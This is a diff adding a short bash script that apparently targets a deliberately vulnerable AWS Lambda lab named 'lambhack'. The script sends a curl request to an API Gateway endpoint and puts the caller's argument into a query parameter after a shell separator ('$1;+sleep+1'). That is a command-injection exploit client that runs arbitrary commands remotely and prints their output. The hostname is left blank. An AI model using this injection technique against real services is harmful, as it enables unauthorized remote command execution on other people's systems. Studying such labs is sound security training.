@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+URL="https://.execute-api.us-east-1.amazonaws.com/prod"
+
+echo -e `curl -s "$URL/lambhack/c?args=$1;+sleep+1"` | tr -d '"'
